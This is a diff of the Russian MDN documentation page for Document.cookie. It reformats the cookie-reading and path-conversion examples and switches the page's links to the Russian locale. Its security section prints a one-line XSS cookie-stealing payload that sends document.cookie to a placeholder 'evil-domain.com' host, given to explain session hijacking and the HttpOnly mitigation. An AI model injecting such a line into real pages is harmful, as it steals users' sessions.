@@ -1,13 +1,6 @@
 ---
 title: Document.cookie
 slug: Web/API/Document/cookie
-tags:
-  - API
-  - Document
-  - HTML DOM
-  - JS
-  - cookie
-translation_of: Web/API/Document/cookie
 ---
 
 {{APIRef("DOM")}}
@@ -92,7 +85,10 @@ function alertCookie() {
 document.cookie = "test1=Hello";
 document.cookie = "test2=World";
 
-var cookieValue = document.cookie.replace(/(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/, "$1");
+var cookieValue = document.cookie.replace(
+  /(?:(?:^|.*;\s*)test2\s*\=\s*([^;]*).*$)|^.*$/,
+  "$1",
+);
 
 function alertCookieValue() {
   alert(cookieValue);
@@ -111,9 +107,15 @@ function alertCookieValue() {
 
 ```js
 function doOnce() {
-  if (document.cookie.replace(/(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/, "$1") !== "true") {
+  if (
+    document.cookie.replace(
+      /(?:(?:^|.*;\s*)doSomethingOnlyOnce\s*\=\s*([^;]*).*$)|^.*$/,
+      "$1",
+    ) !== "true"
+  ) {
     alert("Do something here!");
-    document.cookie = "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
+    document.cookie =
+      "doSomethingOnlyOnce=true; expires=Fri, 31 Dec 9999 23:59:59 GMT";
   }
 }
 ```
@@ -128,7 +130,8 @@ function doOnce() {
 
 ```js
 function resetOnce() {
-  document.cookie = "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
+  document.cookie =
+    "doSomethingOnlyOnce=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
 }
 ```
 
@@ -181,7 +184,8 @@ It is important to note that the path attribute does **not** protect against una
 Cookies are often used in web application to identify a user and their authenticated session. So stealing cookie from a web application, will lead to hijacking the authenticated user's session. Common ways to steal cookies include using Social Engineering or by exploiting an XSS vulnerability in the application -
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 The HTTPOnly cookie attribute can help to mitigate this attack by preventing access to cookie value through Javascript. Read more about [Cookies and Security](http://www.nczonline.net/blog/2009/05/12/cookies-and-security/).
@@ -226,7 +230,7 @@ The [`path`](#new-cookie_path) parameter of a new cookie can accept only _absolu
 |*|
 |*|  :: Translate relative paths to absolute paths ::
 |*|
-|*|  https://developer.mozilla.org/en-US/docs/Web/API/document.cookie
+|*|  https://developer.mozilla.org/ru/docs/Web/API/document.cookie
 |*|  https://developer.mozilla.org/User:fusionchess
 |*|
 |*|  The following code is released under the GNU Public License, version 3 or later.
@@ -234,11 +238,23 @@ The [`path`](#new-cookie_path) parameter of a new cookie can accept only _absolu
 |*|
 \*/
 
-function relPathToAbs (sRelPath) {
-  var nUpLn, sDir = "", sPath = location.pathname.replace(/[^\/]*$/, sRelPath.replace(/(\/|^)(?:\.?\/+)+/g, "$1"));
-  for (var nEnd, nStart = 0; nEnd = sPath.indexOf("/../", nStart), nEnd > -1; nStart = nEnd + nUpLn) {
+function relPathToAbs(sRelPath) {
+  var nUpLn,
+    sDir = "",
+    sPath = location.pathname.replace(
+      /[^\/]*$/,
+      sRelPath.replace(/(\/|^)(?:\.?\/+)+/g, "$1"),
+    );
+  for (
+    var nEnd, nStart = 0;
+    (nEnd = sPath.indexOf("/../", nStart)), nEnd > -1;
+    nStart = nEnd + nUpLn
+  ) {
     nUpLn = /^\/(?:\.\.\/)*/.exec(sPath.slice(nEnd))[0].length;
-    sDir = (sDir + sPath.substring(nStart, nEnd)).replace(new RegExp("(?:\\\/+[^\\\/]*){0," + ((nUpLn - 1) / 3) + "}$"), "/");
+    sDir = (sDir + sPath.substring(nStart, nEnd)).replace(
+      new RegExp("(?:\\/+[^\\/]*){0," + (nUpLn - 1) / 3 + "}$"),
+      "/",
+    );
   }
   return sDir + sPath.substr(nStart);
 }
@@ -247,22 +263,22 @@ function relPathToAbs (sRelPath) {
 ##### Sample usage
 
 ```js
-/* Let us be in /en-US/docs/Web/API/document.cookie */
+/* Let us be in /ru/docs/Web/API/document.cookie */
 
 alert(location.pathname);
-// displays: /en-US/docs/Web/API/document.cookie
+// displays: /ru/docs/Web/API/document.cookie
 
 alert(relPathToAbs("./"));
-// displays: /en-US/docs/Web/API/
+// displays: /ru/docs/Web/API/
 
 alert(relPathToAbs("../Guide/API/DOM/Storage"));
-// displays: /en-US/docs/Web/Guide/API/DOM/Storage
+// displays: /ru/docs/Web/Guide/API/DOM/Storage
 
 alert(relPathToAbs("../../Firefox"));
-// displays: /en-US/docs/Firefox
+// displays: /ru/docs/Firefox
 
 alert(relPathToAbs("../Guide/././API/../../../Firefox"));
-// displays: /en-US/docs/Firefox
+// displays: /ru/docs/Firefox
 ```
 
 ### Относительный срок годности cookie: числовые примеры
@@ -334,7 +350,7 @@ executeOnce(alertSomething, null, "Hello world!!!!", "alert_something");
 
 {{Specifications}}
 
-## Браузерная поддержка
+## Совместимость с браузерами
 
 {{Compat}}
 
